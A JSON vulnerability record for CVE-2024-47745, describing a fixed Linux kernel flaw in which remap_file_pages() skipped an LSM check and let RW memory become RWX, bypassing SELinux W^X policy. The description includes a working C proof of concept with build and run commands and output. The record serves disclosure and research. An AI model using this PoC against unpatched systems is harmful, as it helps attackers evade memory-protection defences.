{
    "id": "CVE-2024-47745",
    "product": "Linux",
    "version": "1da177e4c3f4< 0f910dbf2f2a ",
    "vulnerability": [
        "n/a"
    ],
    "description": "In the Linux kernel, the following vulnerability has been resolved:mm: call the security_mmap_file() LSM hook in remap_file_pages()The remap_file_pages syscall handler calls do_mmap() directly, whichdoesn't contain the LSM security check. And if the process has calledpersonality(READ_IMPLIES_EXEC) before and remap_file_pages() is called forRW pages, this will actually result in remapping the pages to RWX,bypassing a W^X policy enforced by SELinux.So we should check prot by security_mmap_file LSM hook in theremap_file_pages syscall handler before do_mmap() is called. Otherwise, itpotentially permits an attacker to bypass a W^X policy enforced bySELinux.The bypass is similar to CVE-2016-10044, which bypass the same thing viaAIO and can be found in [1].The PoC:$ cat > test.cint main(void) {\tsize_t pagesz = sysconf(_SC_PAGE_SIZE);\tint mfd = syscall(SYS_memfd_create, \"test\", 0);\tconst char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,\t\tMAP_SHARED, mfd, 0);\tunsigned int old = syscall(SYS_personality, 0xffffffff);\tsyscall(SYS_personality, READ_IMPLIES_EXEC | old);\tsyscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);\tsyscall(SYS_personality, old);\t// show the RWX page exists even if W^X policy is enforced\tint fd = open(\"/proc/self/maps\", O_RDONLY);\tunsigned char buf2[1024];\twhile (1) {\t\tint ret = read(fd, buf2, 1024);\t\tif (ret <= 0) break;\t\twrite(1, buf2, ret);\t}\tclose(fd);}$ gcc test.c -o test$ ./test | grep rwx7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)[PM: subject line tweaks]",
    "poc": {
        "reference": [
            "https://git.kernel.org/stable/c/49d3a4ad57c57227c3b0fd6cd4188b2a5ebd6178",
            "https://git.kernel.org/stable/c/ea7e2d5e49c05e5db1922387b09ca74aa40f46e2"
        ],
        "github": [
            "https://github.com/fkie-cad/nvd-json-data-feeds"
        ]
    }
}